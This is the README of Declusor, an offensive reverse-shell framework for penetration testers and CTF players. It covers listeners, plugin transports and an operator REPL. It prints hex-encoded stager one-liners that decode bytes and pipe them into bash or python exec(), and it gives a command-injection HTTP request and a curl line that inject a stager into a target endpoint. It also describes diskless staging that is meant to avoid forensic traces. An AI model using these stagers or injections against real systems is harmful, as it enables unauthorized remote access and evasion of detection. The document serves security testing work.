<div align="center">

  <h1>Declusor</h1>

  <p>
    <strong>A fast, modular, and extensible reverse-shell framework and payload delivery handler for security professionals and CTF players.</strong>
  </p>

  <p>
    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
    <a href="https://www.python.org/"><img src="https://img.shields.io/badge/python-3.11%2B-blue.svg" alt="Python 3.11+"></a>
    <a href="https://mypy.readthedocs.io/"><img src="https://img.shields.io/badge/typing-strict-brightgreen.svg" alt="Typing: Strict"></a>
    <a href="https://docs.astral.sh/ruff/"><img src="https://img.shields.io/badge/code%20style-ruff-orange.svg" alt="Code Style: Ruff"></a>
  </p>

  <p>
    <a href="#why-declusor">Why Declusor</a> •
    <a href="#see-it-in-action">Demo</a> •
    <a href="#key-capabilities">Capabilities</a> •
    <a href="#getting-started">Quickstart</a> •
    <a href="#real-world-workflow--usage">Usage</a> •
    <a href="#extensible-plugin-ecosystem">Plugins</a> •
    <a href="#architectural-highlights">Architecture</a> •
    <a href="#contributing--quality-gates">Contributing</a>
  </p>

</div>

## Why Declusor?

Catching a reverse shell during a penetration test, CTF, or security assessment shouldn't feel like walking a tightrope:

- **Netcat is a little too minimal**: You get your shell, hit `Ctrl+C` by accident, and suddenly you're back to Googling PTY one-liners, running `stty raw -echo`, and hoping your next binary transfer doesn't eat the connection.
- **Many C2 frameworks are a bit much**: Sometimes you just want to catch a shell and run `id`. You don't need twelve containers, a database, and a team server for that.
- **Raw sockets don't handle drama well**: A few lines of socket code work great — until the connection drops, binary data shows up, or the shell does something you didn't expect.

### Declusor solves this with quiet elegances

It keeps the zero-infrastructure, instant startup of a standard netcat listener while wrapping the session in a structured, framed transport protocol.

It generates purpose-built stagers, negotiates an in-memory handshake with explicit acknowledgments, and provides a readline-powered REPL on top. The result is a session that doesn't require manual PTY gymnastics or leave you debugging socket desynchronization when things get messy — all from a single lightweight command.

## See It in Action

<p align="center">
  <img src="docs/assets/demo.gif" alt="Declusor Interactive Demo" width="900" onerror="this.onerror=null;this.src='https://i.imgur.com/Wsw2l90.gif';"/>
  <br>
  <em>From listener startup to remote execution in seconds: Catching a reverse shell, navigating with tab-completion, and staging modules in-memory.</em>
</p>

When an operator launches Declusor, the entire engagement workflow is automated:

<div align="center">

| Step | Phase                 | Operator Experience                          | Target Impact                         |
| ---: | :-------------------- | :------------------------------------------- | :------------------------------------ |
|    1 | Listener Launch       | Single CLI command (`declusor 0.0.0.0 4444`) | Prints pre-formatted stager one-liner |
|    2 | Session Establishment | Automatic connection detection & handshake   | Zero manual PTY stabilization needed  |
|    3 | Command Dispatch      | Framed streaming with tab-completion         | Output streamed back chunk-by-chunk   |
|    4 | Post-Exploitation     | In-memory module loading (`load ...`)        | Execution memory-resident; clean exit |

</div>

In other words, Declusor handles the operational details around the session rather than leaving them to the operator:

1. Starts the listener and immediately displays ready-to-inject launcher commands for the target environment.
2. Upon connection, the framework verifies the remote transport, transmits helper libraries in-memory, and negotiates framed communication with sentinel ACKs to prevent socket desynchronization.
3. Provides full command recall (`Up`/`Down`), history search (`Ctrl+R`), and tab-completion for remote executables and local paths.
4. Modules and post-exploitation scripts are staged directly into remote process memory, eliminating temporary files in `/tmp` and minimizing disk forensics.

## Real-World Workflow Examples

### 1. Start the Listener

Start Declusor by specifying your local listening IP and port:

```bash
# Default listener (uses native shell_socket client)
declusor 0.0.0.0 4444

# Select the cross-platform Python client
declusor 0.0.0.0 4444 --plugin py_socket

# Load external custom plugins from an operator directory
declusor 0.0.0.0 4444 --plugin-dir ~/custom_plugins --plugin my_agent
```

On startup, Declusor initializes the listener and **prints the exact one-liner launcher command** to run on your target.

### 2. Built-in Client Transports

| Client Plugin     | Flag              | Target OS             | Execution Mechanism                                                    |
| :---------------- | :---------------- | :-------------------- | :--------------------------------------------------------------------- |
| **Shell Socket**  | `-p shell_socket` | Linux / POSIX         | Native `/dev/tcp` file descriptor; zero external dependencies          |
| **Python Socket** | `-p py_socket`    | Linux, macOS, Windows | In-memory `exec()` with persistent session scope & subprocess fallback |

### 3. Launcher Delivery Options

Operators can control how client stagers are presented or exported via global delivery flags:

```bash
# Print launcher to terminal (default)
declusor 0.0.0.0 4444 -p shell_socket

# Suppress launcher output (silent mode for automation/scripts)
declusor 0.0.0.0 4444 -p shell_socket --launcher-output silent

# Write launcher directly to a file
declusor 0.0.0.0 4444 -p py_socket --launcher-output file:/tmp/stager.py
```

> [!TIP]
> Launchers are automatically hex-encoded and packaged into native execution wrappers by default:
>
> - **`shell_socket`**: `bash -c 'printf "%s" "$1" | while IFS= read -r -n2 byte; do printf "%b" "\\x$byte"; done | bash' _ '$DECLUSOR_SCRIPT'`
> - **`py_socket`**: `python3 -c 'exec(bytes.fromhex("$DECLUSOR_SCRIPT"))'`

### 4. Interact with the Session

Once your target connects back, Declusor drops you into an interactive session:

```text
[declusor] help
help    : Show available commands or detailed help for one command.
load    : Load a module on the remote client.
command : Run a command on the remote client.
eval    : Evaluate code in the client runtime.
shell   : Start an interactive remote shell.
upload  : Upload a local file to the remote client.
execute : Execute a local script on the remote client.
exit    : End the active session.
```

#### Example: Running Commands

```text
[declusor] command 'id && uname -a'
uid=1000(dev) gid=1000(dev) groups=1000(dev),27(sudo)
Linux target-node 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
```

#### Example: In-Memory Module Loading

```text
[declusor] load discovery/system_info.py

SYSTEM INFORMATION
------------------
OS: Linux 6.8.0-45-generic (#45-Ubuntu SMP PREEMPT_DYNAMIC)
Architecture: x86_64
Hostname: target-host
User: dev
```

## Practical Usage Examples

Declusor is purpose-built to turn unauthenticated Remote Code Execution (RCE) and Command Injection vulnerabilities into stable, feature-rich operator sessions.

### Web OS Command Injection

When testing an injection point in an HTTP query or form parameter (e.g., a vulnerable diagnostic `ping` or export function):

```http
POST /api/diagnostics/ping HTTP/1.1
Host: target.local
Content-Type: application/json

{"ip": "127.0.0.1; <STAGER_PAYLOAD>"}
```

**1. Start Declusor locally on your interface:**

```bash
declusor 127.0.0.1 4444 --plugin shell_socket
```

**2. Declusor will immediately print the tailored, hex-encoded launcher one-liner ready for execution:**

```bash
# Inject the displayed one-liner directly via curl
curl -s -X POST https://target.example/api/diagnostics/ping \
     -H "Content-Type: application/json" \
  -d "{\"ip\": \"127.0.0.1; <DECLUSOR_SHELL_SOCKET_HEX_LAUNCHER>\"}"
```

**3. Upon connection, Declusor runs its in-memory handshake, pushes helper utilities, and opens an interactive REPL with full history and tab-completion.**

```console
$ declusor 127.0.0.1 4444
bash -c 'printf "%s" "$1" | while IFS= read -r -n2 byte; do printf "%b" "\\x$byte"; done | bash' _ '<DECLUSOR_HEX_STAGER>'

[declusor]
```

## Key Capabilities

### Operator Console & Terminal Ergonomics

- **Command-Aware Readline REPL**: Interactive command loop with intelligent tab-completion dynamically scoped to active plugin assets (automatically discovering modules in `assets/modules/` for `load`) while preserving local filesystem navigation for `upload` and `execute`.
- **Persistent History & Navigation Safety**: Maintains cross-session command history and insulates the connection against drops caused by unhandled arrow keys or terminal escape sequences.
- **Real-Time Stream Delivery & Diagnostics**: Streams remote stdout/stderr chunks in real time, accompanied by dedicated diagnostic reporting and structured tabular formatting.

### Remote Execution & Payload Delivery Primitives

- **Framed Remote Command Dispatch (`command`)**: Executes individual commands on the remote target with framing sentinels that prevent socket desynchronization.
- **Diskless In-Memory Script Staging (`execute`)**: Streams local scripts directly into remote process memory, eliminating on-disk forensic artifacts in temporary directories.
- **Chunked Binary Staging & Uploads (`upload`)**: Transfers reconnaissance, enumeration, and privilege-escalation binaries via framed byte chunks.
- **Directory-Isolated Modular Payloads (`load`)**: Stages and executes modular post-exploitation tasks directly from local module directories with strict argument boundaries.
- **Direct Interactive Shell Pass-Through (`shell`)**: Transitions from structured framed dispatch to an unconstrained, interactive shell session whenever raw terminal access is required.

### Extensible Transports & Autonomous Plugins

- **Decoupled Transport Abstraction (`ITransport`)**: Separates low-level byte streaming from session protocols. Native support for physical TCP sockets (`SocketTransport`, `TcpListener`), in-memory streams (`MemoryTransport`), and composable stream cipher decorators (`XorTransport`).
- **Stream Fragmentation Immunity**: Egress and ingress cursors are tracked independently across stream decorators, guaranteeing that arbitrary TCP packet segmentation never desynchronizes obfuscated or encrypted channels.
- **Three-Tier Dynamic Plugin Discovery**: Discovers transport plugins across repository built-ins, installed distribution packages (PEP 621 entry points), and drop-in operator directories (`--plugin-dir`).
- **Decoupled Transport Protocols & Agents**: Bundles native Linux `/dev/tcp` (`shell_socket`) and in-memory Python (`py_socket`) clients with zero hardcoded dependencies on the core orchestration engine.
- **Contract-First Interface Isolation**: Enforces strict domain contracts (`IPlugin`, `IPluginRuntime`, `IConnection`, `ITransport`) with isolated asset overlays for launchers, initialization helpers, and payloads.
- **Deterministic Conformance Test Suite**: Equips plugin authors with `PluginConformanceTestSuite` and typed test doubles (`MemoryTransport`, `DummyTransport`) to verify full contract compliance in milliseconds without brittle mocks or network port binding.

## Getting Started

### Prerequisites

Declusor requires **Python 3.11+** and runs natively on Linux, macOS, and Windows. Package management requires **pip** or optionally—and recommended—[**uv**](https://github.com/astral-sh/uv) and **GNU Make** for fast and standardized workflows.

### Installation

Declusor and its built-in plugins are installed from the GitHub repository; they are not published on PyPI.

#### Option A: Install from GitHub with `uv` (Recommended)

Clone the repository, create its virtual environment, and install the CLI and built-in plugins:

```bash
git clone https://github.com/othonhugo/declusor.git
cd declusor
uv sync --no-default-groups
make install-plugins
.venv/bin/declusor 0.0.0.0 4444
```

#### Option B: Install from GitHub with `pip`

```bash
git clone https://github.com/othonhugo/declusor.git
cd declusor

# Create and activate an isolated environment
python3 -m venv .venv && source .venv/bin/activate

# Install the CLI from the checkout and link its built-in plugins
python -m pip install -e .
make install-plugins

# Start the CLI
declusor 0.0.0.0 4444
```

## Extensible Plugin Ecosystem

Declusor was architected from day one as an extensible engine. Transport plugins are fully autonomous packages with their own manifests, assets, and tests:

```text
plugins/<plugin_name>/
├── pyproject.toml                # Standalone package metadata & entry-point declaration
├── README.md                     # Documentation (## Modules and ## Design Principles)
├── src/declusor_<plugin_name>/   # Core transport and runtime implementation
│   ├── __init__.py               # Public exports (__all__ = ["<PluginClass>"])
│   ├── plugin.py                 # Implements IPluginExtension, IPluginRuntime, and IPluginProcessor
│   └── connection.py             # Implements IConnection and IOperationRenderer
├── assets/                       # Bundled stagers and operational payloads
│   ├── launchers/                # Client bootstrap templates (e.g. client.sh, client.py)
│   ├── helpers/                  # In-memory initialization libraries (sent during handshake)
│   └── modules/                  # On-demand reconnaissance and post-exploitation payloads
└── tests/                        # Dedicated unit & contract conformance test suite
    └── test_conformance.py       # Inherits from PluginConformanceTestSuite
```

### Multi-Tier Dynamic Discovery

Declusor discovers plugins at runtime across three distinct source tiers with zero hardcoded coupling:

1. **Built-in Plugins**: Shipped repository packages located in `plugins/`.
2. **Python Entry Points**: Standard distribution packages registered via PEP 621 entry points (`[project.entry-points."declusor.plugins"]`).
3. **Operator Drop-in Folders**: Custom plugin directories loaded dynamically on the fly via `--plugin-dir <path>`.

For complete packaging tutorials, asset overlay mechanics, and step-by-step guides, check out the [Plugins Developer Guide](plugins/README.md).

## Architectural Highlights

Declusor adheres to strict **Clean Architecture** and **Dependency Inversion** principles:

- **Strict 11-Tier Downward Hierarchy**: Dependencies flow downward through 11 cleanly separated layers from composition roots (`main`, `app`) down to foundational primitives (`config`, `util`), with pure domain contracts (`contract`) completely decoupled from concrete plugins.
- **Dynamic Signature Introspection**: Application and transport factories dynamically inspect parameter signatures via `inspect.signature`, enabling flexible headless dependency injection (`listener_factory`, `launcher_renderer`) without fragile exception-catching.
- **Dual-Channel Stream Isolation**: Physical separation of raw binary payloads (`sys.stdout.buffer`) from formatted console output (`sys.stdout`) guarantees zero stream corruption or terminal bleeding.
- **Pluggable & Composable Transports**: The transport layer (`declusor.transport`) isolates physical network mechanics behind `ITransport` and `ITransportListener`, supporting composable decorator pipelines (e.g. XOR obfuscation) without touching session logic.
- **Fail-Fast Invariants**: Immutable Command DTOs validate parameters at the boundary, preventing invalid operations from propagating into transports.
- **Deterministic Flow Control**: Controllers return explicit lifecycle signals (`CONTINUE`, `TERMINATE`) rather than relying on control-flow exceptions.
- **Mock-Free Determinism**: Test suites utilize in-memory duplex transports (`MemoryTransport`, `MemoryTransportListener`), enabling full end-to-end handshake and lifecycle tests without binding real network ports or relying on fragile monkeypatching.
- **Memory-Isolated Conformance & 100% Strict Typing**: Over 1,360 precision tests running across memory-isolated test sessions (`make test-unit`, `make test-e2e`, `make test-plugins`), organized into 100% class-based test suites under strict Mypy type enforcement.

Read the complete architectural specification in [ARCHITECTURE.md](ARCHITECTURE.md).

## Contributing & Quality Gates

Contributions from both humans and autonomous agents are warmly welcomed! Please read our [CONTRIBUTING.md](CONTRIBUTING.md) guide before opening a pull request.

All contributions must pass the verification gate with zero warnings or errors:

```bash
make check  # Runs format-check, lint, strict mypy type analysis, and all memory-isolated test suites
```

## License

This project is open-source software licensed under the [MIT License](LICENSE).

> [!WARNING]
> **Legal Disclaimer**: Declusor is intended solely for educational purposes and authorized security research. The authors assume no liability for misuse. Executing this software against systems without explicit, prior written authorization is strictly prohibited.
